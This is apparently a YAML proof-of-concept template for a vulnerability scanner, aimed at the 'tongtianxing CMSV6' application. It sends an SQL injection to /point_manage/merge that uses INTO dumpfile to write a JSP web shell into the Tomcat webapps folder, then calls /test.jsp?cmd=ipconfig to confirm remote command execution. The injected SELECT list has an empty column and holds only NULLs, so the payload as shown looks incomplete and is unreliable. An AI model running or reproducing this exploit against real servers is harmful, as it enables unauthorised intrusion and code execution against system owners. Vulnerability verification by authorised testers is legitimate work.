name: poc-yaml-tongtianxingCMSV6-point_manage_merge-sql-RCE
transport: http


rules:
  r0:
    request:
      method: POST
      path: /point_manage/merge
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: "
        id=1&name=1' UNION SELECT%0aNULL, ,NULL,NULL,NULL,NULL,NULL,NULL
        INTO dumpfile '../../tomcat/webapps/gpsweb/test.jsp' FROM user_session a
        WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
        "
    expression: response.status == 200 
  r1:
    request:
      method: GET
      path: /test.jsp?cmd=ipconfig
    expression: response.status == 200 && response.body.bcontains(b'Windows IP')

expression: r0() && r1()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/139937883
